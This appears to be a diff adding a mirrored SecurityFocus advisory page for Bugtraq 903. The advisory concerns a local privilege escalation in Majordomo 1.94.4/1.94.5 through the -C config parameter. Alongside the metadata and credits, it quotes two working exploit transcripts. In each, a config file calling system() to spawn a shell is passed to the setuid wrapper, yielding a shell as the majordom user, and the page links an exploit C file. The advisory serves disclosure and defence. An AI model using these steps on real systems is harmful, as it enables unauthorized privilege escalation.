@@ -1,0 +1,101 @@
+<p><b><span style="font-size: 18pt;">Majordomo Local -C Parameter Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/903/info">info</a><br><a href="http://www.securityfocus.com/bid/903/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/903/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/903/solution">solution</a><br><a href="http://www.securityfocus.com/bid/903/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				903
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Dec 29 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Dec 29 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was first published by Shevek &lt;shevek@anarres.org&gt; on December 2, 1999.
+
+ First posted to Bugtraq by Olaf Kirch &lt;okir@monad.swb.de&gt; on December 29, 1999.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Great Circle Associates Majordomo 1.94.5 <br/>
+					
+				
+					Great Circle Associates Majordomo 1.94.4 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/903/majordomo-expl.c">#exploit</a><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	 The following, taken from Olaf Kirch &lt;okir@monad.swb.de&gt;'s Bugtraq post presents an example (taken from Shevek's post to a Great Circle Majordomo list):<br/><br/>shevek@tirin ~$ cat foo.pl<br/>system("/bin/csh");<br/>shevek@tirin ~$ /usr/local/majordomo/wrapper majordomo -C /home/shevek/foo.pl<br/>%<br/>%whoami<br/>majordom<br/>------<br/><br/>Here's another example (using a different script), posted to Bugtraq by Federico G. Schwindt &lt;Federico G. Schwindt&gt; on May 23, 2000:<br/><br/>$ cat /tmp/myconf<br/>system("/bin/sh");<br/>$ id<br/>uid=1000(fgsch) gid=1000(fgsch) groups=1000(fgsch), 0(wheel), 11(core)<br/>$ ./wrapper bounce-remind -C /tmp/myconf<br/>$ id<br/>uid=41(majordom) gid=41(majordom) groups=1000(fgsch), 0(wheel), 11(core)
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/majordomo-expl.c">/data/vulnerabilities/exploits/majordomo-expl.c</a></li>
+</ul>
+</div>
